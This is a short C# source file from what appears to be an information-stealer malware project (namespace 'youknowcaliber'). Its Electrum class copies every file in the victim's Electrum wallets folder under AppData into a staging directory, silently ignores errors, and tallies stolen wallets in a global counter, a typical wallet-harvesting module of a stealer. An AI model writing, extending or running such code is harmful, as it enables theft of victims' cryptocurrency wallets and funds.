﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class Electrum
	{
		public static void EleStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Electrum\\wallets").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Electrum.ElectrumDir);
					fileInfo.CopyTo(directorypath + Electrum.ElectrumDir + fileInfo.Name);
				}
				Electrum.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		public static int count = 0;

		public static string ElectrumDir = "\\Wallets\\Electrum\\";
	}
}
